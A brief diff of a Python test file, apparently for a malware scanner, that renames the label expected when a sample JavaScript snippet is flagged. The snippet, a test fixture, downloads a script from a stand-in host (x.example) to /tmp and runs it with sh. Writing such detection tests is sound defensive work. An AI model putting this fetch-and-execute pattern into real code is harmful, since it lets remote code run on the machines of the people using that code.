@@ -86,7 +86,7 @@ def test_download_and_run():
         https.get('https://x.example/payload', r => r.pipe(fs.createWriteStream('/tmp/p.sh')));
         exec('sh /tmp/p.sh');
     ''')
-    assert "download-exec" in found
+    assert "fetch-and-run" in found
 
 
 def test_republishes_itself():
